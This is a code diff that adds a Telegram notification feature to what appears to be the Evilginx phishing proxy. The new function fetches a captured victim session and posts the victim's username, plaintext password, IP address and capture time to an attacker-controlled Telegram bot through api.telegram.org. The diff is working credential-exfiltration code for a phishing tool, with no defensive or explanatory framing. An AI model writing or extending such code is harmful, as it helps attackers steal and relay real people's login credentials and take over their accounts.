@@ -2228,3 +2228,84 @@ func rewriteSensitivePaths(body []byte, phishHost string) []byte {
 
     return []byte(bodyStr)
 }
+
+func (p *HttpProxy) ReloadTelegramConfig() {
+    log.Info("Telegram configuration reloaded")
+}
+
+func (p *HttpProxy) sendTelegramNotificationForSession(sid string) {
+    if sid == "" {
+        return
+    }
+    
+    botToken := p.cfg.GetTelegramBotToken()
+    chatId := p.cfg.GetTelegramChatID()
+    
+    if botToken == "" || chatId == "" {
+        log.Debug("Telegram: bot token or chat ID not configured, skipping notification")
+        return
+    }
+    
+    // Get all sessions and find the one with matching session_id
+    sessions, err := p.db.ListSessions()
+    if err != nil {
+        log.Error("Telegram: failed to list sessions: %v", err)
+        return
+    }
+    
+    var session *database.Session
+    for _, s := range sessions {
+        if s.SessionId == sid {
+            session = s
+            break
+        }
+    }
+    
+    if session == nil {
+        log.Debug("Telegram: session %s not found in database", sid)
+        return
+    }
+    
+    message := fmt.Sprintf(
+        "🔴 *New Evilginx Session Captured!*\n\n"+
+            "*Site:* %s\n"+
+            "*Username:* %s\n"+
+            "*Password:* %s\n"+
+            "*IP:* %s\n"+
+            "*Time:* %s",
+        session.Phishlet,
+        session.Username,
+        session.Password,
+        session.RemoteAddr,
+        time.Unix(session.CreateTime, 0).Format("2006-01-02 15:04:05"),
+    )
+    
+    telegramUrl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
+    
+    payload := map[string]interface{}{
+        "chat_id":    chatId,
+        "text":       message,
+        "parse_mode": "Markdown",
+    }
+    
+    jsonPayload, err := json.Marshal(payload)
+    if err != nil {
+        log.Error("Telegram: failed to marshal payload: %v", err)
+        return
+    }
+    
+    go func() {
+        resp, err := http.Post(telegramUrl, "application/json", bytes.NewBuffer(jsonPayload))
+        if err != nil {
+            log.Error("Telegram: failed to send message: %v", err)
+            return
+        }
+        defer resp.Body.Close()
+        if resp.StatusCode == http.StatusOK {
+            log.Success("Telegram notification sent for session: %s", sid)
+        } else {
+            body, _ := io.ReadAll(resp.Body)
+            log.Error("Telegram: API returned %d: %s", resp.StatusCode, string(body))
+        }
+    }()
+}
